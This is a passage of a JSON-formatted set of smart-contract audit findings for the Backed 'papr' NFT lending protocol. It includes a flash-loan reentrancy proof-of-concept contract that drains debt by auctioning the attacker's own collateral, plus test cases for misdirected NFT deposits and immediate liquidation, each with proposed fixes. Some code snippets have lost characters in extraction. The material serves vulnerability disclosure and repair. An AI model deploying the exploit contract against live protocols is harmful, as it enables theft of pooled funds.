BobContract.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72\n\n*    excess   = 150k Since it is larger than zero, the function _handleExcess is called.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532\n\n*    fee   = 15k Considering 10% fee on the excess\n*   credit = 135k\n*    totalOwed   = 135k Since this is smaller than debtCaches 250k, the function _reduceDebt is called to reduce debt from 250k to 115k.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549\n\n*   remaining = 115k\n*   All the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, 115k remains as debt.\n*   In the last part of the function purchaseLiquidationAuctionNFT, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored.\n\n<!----\n\n    if (isLastCollateral && remaining != 0) {\n                /// there will be debt left with no NFTs, set it to 0\n                _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n            }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290\n\n*   Now, the control returns back to the contract PaprController. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed.\n\n<!----\n\n    if (debt  max) {\n                revert IPaprController.ExceedsMaxDebt(debt, max);\n            }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449\n\n*   Now that the attack is finished, BobContract repays the flash loan after selling those 10 NFTs.\n*   *Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob's profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.*\n*   Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.\n*   Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3*50k = 150k) while the total debt was 75k.\n*   *In order to take profit and steal funds, the attacker at least should add 7 NFTs as collateral and borrow the max debt. Because numberOfNFT * oraclePrice * 50%  oraclePrice * 3*\n\nIn the following PoC, I am showing how the attack can be applied.\n\nBob deploys the following contract and calls the function attack(). It takes flash loan from AAVE, then the callback from the AAVE will execute executeOperation. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol.\n\nThen, it borrows max debt which is almost 250k, and remove the NFT with id 1.\n\nIn the callback of safeTransferFrom, the function onERC721Received is called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively.\n\nWhen NFTs with id 9 is removed, the function startLiquidationAuction is called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n\ninterface ERC721 {}\n\ninterface ERC20 {}\n\nstruct Collateral {\n    ERC721 addr;\n    uint256 id;\n}\nstruct OracleInfo {\n    Message message;\n    Sig sig;\n}\nstruct Message {\n    bytes32 id;\n    bytes payload;\n    uint256 timestamp;\n    bytes signature;\n}\nstruct Sig {\n    uint8 v;\n    bytes32 r;\n    bytes32 s;\n}\nstruct Auction {\n    address nftOwner;\n    uint256 auctionAssetID;\n    ERC721 auctionAssetContract;\n    uint256 perPeriodDecayPercentWad;\n    uint256 secondsInPeriod;\n    uint256 startPrice;\n    ERC20 paymentAsset;\n}\n\nenum PriceKind {\n    SPOT,\n    TWAP,\n    LOWER,\n    UPPER\n}\n\ninterface IPaprController {\n    function addCollateral(Collateral[] calldata collateral) external;\n\n    function increaseDebt(\n        address mintTo,\n        ERC721 asset,\n        uint256 amount,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function removeCollateral(\n        address sendTo,\n        Collateral[] calldata collateralArr,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function startLiquidationAuction(\n        address account,\n        Collateral calldata collateral,\n        OracleInfo calldata oracleInfo\n    ) external returns (Auction memory auction);\n\n    function purchaseLiquidationAuctionNFT(\n        Auction calldata auction,\n        uint256 maxPrice,\n        address sendTo,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function maxDebt(uint256 totalCollateraValue)\n        external\n        view\n        returns (uint256);\n\n    function underwritePriceForCollateral(\n        ERC721 asset,\n        PriceKind priceKind,\n        OracleInfo memory oracleInfo\n    ) external returns (uint256);\n}\n\ninterface IFundingRateController {\n    function updateTarget() external returns (uint256);\n}\n\ninterface IAAVE {\n    function flashLoanSimple(\n        address receiverAddress,\n        address asset,\n        uint256 amount,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n}\n\ncontract BobContract {\n    IPaprController iPaprController;\n    IFundingRateController iFundingRateController;\n    IAAVE iAAVE;\n    ERC721 nftCollectionAddress;\n    ERC20 paprToken;\n    Collateral[] collaterals;\n    OracleInfo oracleInfo;\n    uint256 numOfCallback;\n    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    constructor(\n        address _paprControllerAddress,\n        address _fundingRateControllerAddress,\n        address _aaveAddress,\n        ERC721 _nftCollectionAddress,\n        OracleInfo memory _oracleInfo,\n        ERC20 _paprToken\n    ) {\n        iPaprController = IPaprController(_paprControllerAddress);\n        iFundingRateController = IFundingRateController(\n            _fundingRateControllerAddress\n        );\n        iAAVE = IAAVE(_aaveAddress);\n        nftCollectionAddress = _nftCollectionAddress;\n        oracleInfo = _oracleInfo;\n        paprToken = _paprToken;\n    }\n\n    function attack() public {\n        ///// STEP1: taking flash loan\n        iAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 106, \"\", 0);\n    }\n\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        ///// STEP2: buying 10 NFTs\n\n        // Buy 10 NFTs that each worths almost 50k\n        // Assume the ids are from 1 to 10\n\n        ///// STEP3: adding the NFTs as collateral\n        for (uint256 i = 0; i < 10; ++i) {\n            collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));\n        }\n        iPaprController.addCollateral(collaterals);\n\n        ///// STEP4: borrowing as much as possible\n        uint256 oraclePrice = iPaprController.underwritePriceForCollateral(\n            nftCollectionAddress,\n            PriceKind.LOWER,\n            oracleInfo\n        );\n\n        uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);\n\n        iPaprController.increaseDebt(\n            address(this),\n            nftCollectionAddress,\n            maxDebt,\n            oracleInfo\n        );\n\n        ///// STEP5: removing the NFT with id 1\n        Collateral[] memory collateralArr = new Collateral[(1);\n        collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});\n        iPaprController.removeCollateral(\n            address(this),\n            collateralArr,\n            oracleInfo\n        );\n\n        ///// STEP16: selling 10 NFTs and repaying the flash loan\n\n        // Selling the 10 NFTs\n        // Repaying the flash loan\n    }\n\n    function onERC721Received(\n        address from,\n        address,\n        uint256 _id,\n        bytes calldata data\n    ) external returns (bytes4) {\n        numOfCallback++;\n        if (numOfCallback < 9) {\n            ///// STEP6 STEP13: removing the NFTs with id 2 to 9\n            Collateral[] memory collateralArr = new Collateral[(1);\n            collateralArr[0] = Collateral({\n                addr: nftCollectionAddress,\n                id: _id + 1\n            });\n            iPaprController.removeCollateral(\n                address(this),\n                collateralArr,\n                oracleInfo\n            );\n        } else {\n            ///// STEP14: starting the auction for NFT with id 10\n            Collateral memory lastCollateral = Collateral({\n                addr: nftCollectionAddress,\n                id: _id + 1\n            });\n            iPaprController.startLiquidationAuction(\n                address(this),\n                lastCollateral,\n                oracleInfo\n            );\n\n            ///// STEP15: buying the NFT with id 10 on the auction\n            uint256 oraclePrice = iPaprController.underwritePriceForCollateral(\n                nftCollectionAddress,\n                PriceKind.LOWER,\n                oracleInfo\n            );\n            uint256 startPrice = (oraclePrice * 3 * 1e18) /\n                iFundingRateController.updateTarget();\n\n            Auction memory auction = Auction({\n                nftOwner: address(this),\n                auctionAssetID: 10,\n                auctionAssetContract: nftCollectionAddress,\n                perPeriodDecayPercentWad: 0.7e18,\n                secondsInPeriod: 1 days,\n                startPrice: startPrice,\n                paymentAsset: paprToken\n            });\n\n            iPaprController.purchaseLiquidationAuctionNFT(\n                auction,\n                startPrice,\n                address(this),\n                oracleInfo\n            );\n        }\n    }\n}\n\n\n\n",
                "Repair": "\nAdding a reentrancy guard to the involved functions can be a solution.\n\nwilsoncusack (Backed) confirmed and commented(https://github.com/code-423n4/2022-12-backed-findings/issues/102#issuecomment-1370990330):\n  There is actually a simpler attack here: add one NFT and borrow max debt. Start Liquidation auction and purchase. On purchase reenter via safeTransferFrom and add many more NFTs, borrowing max. Purchase thinks this is the borrowers last NFT and debt is set to 0. Now borrower can withdraw all other NFTs for free.\n \n \n  We could:\n change removeCollateral to have the debt check BEFORE we send the NFT out, which would prevent sell to repay flows \n add a reentrancy guard on startAuction so that it can't be composed with others. \n add a reentrancy guard on purchase so that it can't be composed with others \n\n*\n\n\n"
            },
            {
                "Name": "H-03",
                "Location": [
                    "//solidity\ntry IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {\n",
                    "//solidity\n// test/paprController/OnERC721ReceivedTest.sol\n\nfunction testSafeTransferByOperator_AUDIT() public {\n    address operator = address(0x12345);\n\n    vm.prank(borrower);\n    nft.setApprovalForAll(operator, true);\n\n    vm.prank(operator);\n    nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));\n\n    // NFT was deposited to the operator's vault.\n    IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(operator, collateral.addr);\n    assertEq(vaultInfo.count, 1);\n\n    // Borrower has 0 tokens in collateral.\n    vaultInfo = controller.vaultInfo(borrower, collateral.addr);\n    assertEq(vaultInfo.count, 0);\n}\n\nfunction testSafeTransferByApproved_AUDIT() public {\n    address approved = address(0x12345);\n\n    vm.prank(borrower);\n    nft.approve(approved, collateralId);\n\n    vm.prank(approved);\n    nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));\n\n    // NFT was deposited to the approved address's vault.\n    IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(approved, collateral.addr);\n    assertEq(vaultInfo.count, 1);\n\n    // Borrower has 0 tokens in collateral.\n    vaultInfo = controller.vaultInfo(borrower, collateral.addr);\n    assertEq(vaultInfo.count, 0);\n}\n"
                ],
                "Type": " Collateral NFT deposited to a wrong address, when transferred directly to  PaprController ",
                "Description": "*Submitted by Jeiwan(https://github.com/code-423n4/2022-12-backed-findings/issues/183), also found by Koolex(https://github.com/code-423n4/2022-12-backed-findings/issues/271), Ruhum(https://github.com/code-423n4/2022-12-backed-findings/issues/153), and rotcivegaf(https://github.com/code-423n4/2022-12-backed-findings/issues/121)*\n\nUsers will lose collateral NFTs when they are transferred to PaprController by an approved address or an operator.\n\n\nThe PaprController allows users to deposit NFTs as collateral to borrow Papr tokens. One way of depositing is by transferring an NFT to the contract directly via a call to safeTransferFrom: the contract implements the onERC721Received hook that will handle accounting of the transferred NFT ([PaprController.sol#L159(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L159)). However, the hook implementation uses a wrong argument to identify token owner: the first argument, which is used by the contract to identify token owner, is the address of the safeTransferFrom function caller, which may be an approved address or an operator. The actual owner address is the second argument ([ERC721.sol#L436(https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436)):\n\nsolidity\ntry IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {\n\n\nThus, when an NFT is sent by an approved address or an operator, it'll be deposited to the vault of the approved address or operator:\n\nsolidity\n// test/paprController/OnERC721ReceivedTest.sol\n\nfunction testSafeTransferByOperator_AUDIT() public {\n    address operator = address(0x12345);\n\n    vm.prank(borrower);\n    nft.setApprovalForAll(operator, true);\n\n    vm.prank(operator);\n    nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));\n\n    // NFT was deposited to the operator's vault.\n    IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(operator, collateral.addr);\n    assertEq(vaultInfo.count, 1);\n\n    // Borrower has 0 tokens in collateral.\n    vaultInfo = controller.vaultInfo(borrower, collateral.addr);\n    assertEq(vaultInfo.count, 0);\n}\n\nfunction testSafeTransferByApproved_AUDIT() public {\n    address approved = address(0x12345);\n\n    vm.prank(borrower);\n    nft.approve(approved, collateralId);\n\n    vm.prank(approved);\n    nft.safeTransferFrom(borrower, address(controller), collateralId, abi.encode(safeTransferReceivedArgs));\n\n    // NFT was deposited to the approved address's vault.\n    IPaprController.VaultInfo memory vaultInfo = controller.vaultInfo(approved, collateral.addr);\n    assertEq(vaultInfo.count, 1);\n\n    // Borrower has 0 tokens in collateral.\n    vaultInfo = controller.vaultInfo(borrower, collateral.addr);\n    assertEq(vaultInfo.count, 0);\n}\n\n\n",
                "Repair": "\nConsider this change:\n\ndiff\n--a/src/PaprController.sol\n+++ b/src/PaprController.sol\n@@ -156,7 +156,7 @@ contract PaprController is\n     /// @param _id the id of the NFT\n     /// @param data encoded IPaprController.OnERC721ReceivedArgs\n     /// @return selector indicating succesful receiving of the NFT\n   function onERC721Received(address from, address, uint256 _id, bytes calldata data)\n+    function onERC721Received(address, address from, uint256 _id, bytes calldata data)\n         external\n         override\n         returns (bytes4)\n\n\nwilsoncusack (Backed) confirmed(https://github.com/code-423n4/2022-12-backed-findings/issues/183)\n\n*\n\n\n"
            },
            {
                "Name": "H-04",
                "Location": [
                    "//solidity\nif (newDebt  max) revert IPaprController.ExceedsMaxDebt(newDebt, max);\n",
                    "//solidity\nif (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {\n    revert IPaprController.NotLiquidatable();\n}\n",
                    "//solidity\nfunction _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {\n    uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;\n    return maxLoanUnderlying / cachedTarget;\n}\n",
                    "//solidity\n/// @dev LOWER is the minimum of SPOT and TWAP\n",
                    "//solidity\n// test/paprController/IncreaseDebt.t.sol\n\nevent RemoveCollateral(address indexed account, ERC721 indexed collateralAddress, uint256 indexed tokenId);\n\nfunction testIncreaseDebtAndBeLiquidated_AUDIT() public {\n    vm.startPrank(borrower);\n    nft.approve(address(controller), collateralId);\n    IPaprController.Collateral[] memory c = new IPaprController.Collateral[(1);\n    c[0] = collateral;\n    controller.addCollateral(c);\n\n    // Calculating the max debt for the borrower.\n    uint256 maxDebt = controller.maxDebt(1 * oraclePrice);\n\n    // Taking the maximal debt.\n    vm.expectEmit(true, true, false, true);\n    emit IncreaseDebt(borrower, collateral.addr, maxDebt);\n    controller.increaseDebt(borrower, collateral.addr, maxDebt, oracleInfo);\n    vm.stopPrank();\n\n    // Making a TWAP price that's identical to the LOWER one.\n    priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP;\n    ReservoirOracleUnderwriter.OracleInfo memory twapOracleInfo = _getOracleInfoForCollateral(nft, underlying);\n\n    // The borrower is liquidated in the same block.\n    vm.expectEmit(true, true, false, false);\n    emit RemoveCollateral(borrower, collateral.addr, collateral.id);\n    controller.startLiquidationAuction(borrower, collateral, twapOracleInfo);\n}\n"
                ],
                "Type": " Users may be liquidated right after taking maximal debt",
                "Description": "*Submitted by Jeiwan(https://github.com/code-423n4/2022-12-backed-findings/issues/190)*\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317\n\n\nSince there's no gap between the maximal LTV and the liquidation LTV, user positions may be liquidated as soon as maximal debt is taken, without leaving room for collateral and Papr token prices fluctuations. Users have no chance to add more collateral or reduce debt before being liquidated. This may eventually create more uncovered and bad debt for the protocol.\n\n\nThe protocol allows users to take debt up to the maximal debt, including it ([PaprController.sol#L471(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471)):\n\nsolidity\nif (newDebt  max) revert IPaprController.ExceedsMaxDebt(newDebt, max);\n\n\nHowever, a position becomes liquidable as soon as user's debt reaches user's maximal debt ([PaprController.sol#L317(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317)):\n\nsolidity\nif (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {\n    revert IPaprController.NotLiquidatable();\n}\n\n\nMoreover, the same maximal debt calculation is used during borrowing and liquidating, with the same maximal LTV ([PaprController.sol#L556-L559(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556-L559)):\n\nsolidity\nfunction _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {\n    uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;\n    return maxLoanUnderlying / cachedTarget;\n}\n\n\nEven though different price kinds are used during borrowing and liquidations ([LOWER during borrowing(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L467), TWAP during liquidations(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L316)), the price can in fact match ([ReservoirOracleUnderwriter.sol#L11(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/ReservoirOracleUnderwriter.sol#L11)):\n\nsolidity\n/// @dev LOWER is the minimum of SPOT and TWAP\n\n\nWhich means that the difference in prices doesn't always create a gap in maximal and liquidation LTVs.\n\nThe combination of these factors allows users to take maximal debts and be liquidated immediately, in the same block. Since liquidations are not beneficial for lending protocols, such heavy penalizing of users may harm the protocol and increase total uncovered debt, and potentially lead to a high bad debt.\n\nsolidity\n// test/paprController/IncreaseDebt.t.sol\n\nevent RemoveCollateral(address indexed account, ERC721 indexed collateralAddress, uint256 indexed tokenId);\n\nfunction testIncreaseDebtAndBeLiquidated_AUDIT() public {\n    vm.startPrank(borrower);\n    nft.approve(address(controller), collateralId);\n    IPaprController.Collateral[] memory c = new IPaprController.Collateral[(1);\n    c[0] = collateral;\n    controller.addCollateral(c);\n\n    // Calculating the max debt for the borrower.\n    uint256 maxDebt = controller.maxDebt(1 * oraclePrice);\n\n    // Taking the maximal debt.\n    vm.expectEmit(true, true, false, true);\n    emit IncreaseDebt(borrower, collateral.addr, maxDebt);\n    controller.increaseDebt(borrower, collateral.addr, maxDebt, oracleInfo);\n    vm.stopPrank();\n\n    // Making a TWAP price that's identical to the LOWER one.\n    priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP;\n    ReservoirOracleUnderwriter.OracleInfo memory twapOracleInfo = _getOracleInfoForCollateral(nft, underlying);\n\n    // The borrower is liquidated in the same block.\n    vm.expectEmit(true, true, false, false);\n    emit RemoveCollateral(borrower, collateral.addr, collateral.id);\n    controller.startLiquidationAuction(borrower, collateral, twapOracleInfo);\n}\n\n\n",
                "Repair": "\nConsider adding a liquidation LTV that's bigger than the maximal borrow LTV; positions can only be liquidated after reaching the liquidation LTV. This will create a room for price fluctuations and let users increase their collateral or decrease debt before being liquidating.\n\nAlternatively, consider liquidating positions only after their debt has increased the maximal one:\n\ndiff\n--a/src/PaprController.sol\n+++ b/src/PaprController.sol\n@@ -314,7 +314,7 @@ contract PaprController is\n\n         uint256 oraclePrice =\n             underwritePriceForCollateral(collateral.addr, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo);\n       if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {\n+        if (info.debt <= _maxDebt(oraclePrice * info.count, cachedTarget)) {\n             revert IPaprController.NotLiquidatable();\n         }\n\n\nwilsoncusack (Backed) disagreed with severity and commented(https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1369912705):\n  I agree we should change this to a < PaprController.sol#L471(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471). But I do not see this as High severity, I don't think.\n \n Even with that changed, it is possible to be liquidated in the same block due to Target changing or a new oracle price. I think this is the norm for other lending protocols, e.g. I believe with Compound or Maker you could be liquidated in the same block if you max borrow and the oracle price is updated in the same block?\n\nJeiwan (warden) commented(https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1370385098):\n Other lending protocols, like Compound, Maker, and Aave, have different LTV thresholds. For example, AAVE(https://app.aave.com/reserve-overview/?underlyingAsset=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2&marketName=proto_mainnet)\n \n Max LTV is the maximal debt and Liquidation threshold is the liquidation LTV. Users may borrow until max LTV but they're liquidated only after reaching the liquidation LTV. In the case of ETH, max LTV on AAVE is 82.50% and Liquidation threshold is 86.00%. The difference allows price and collateral value fluctuations, and it depends on the risk profile of an asset. For example, it's 13% for LINK(https://app.aave.com/reserve-overview/?underlyingAsset=0x514910771af9ca656af840dff83e8264ecf986ca&marketName=proto_mainnet)\n\n This difference protects users from liquidations caused by high volatility.\n \n This is a high finding because users lose funds during liquidations and every liquidation may create bad debt for the protocol. Liquidations are harmful for both protocols and users, so lending protocols shouldn't allow users to borrow themselves right into liquidations.\n\nwilsoncusack (Backed) commented(https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1370387712):\n  Thanks! TIL. My main reference was squeeth and there you can borrow right up to max (unless I miss something, again). Will consider making this change! \n\ntrust1995 (judge) commented(https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1370836207):\n  Because warden has demonstrated there is potentially no gap between liquidation LTV and borrow LTV, will treat this as HIGH impact. If the gap was even 1 wei I believe it would be a MEDIUM find, but the current code incentivizes MEV bots liquidating max debt positions in the same block.\n\n\n*\n\n \n\n"
            }
        ]
    }
]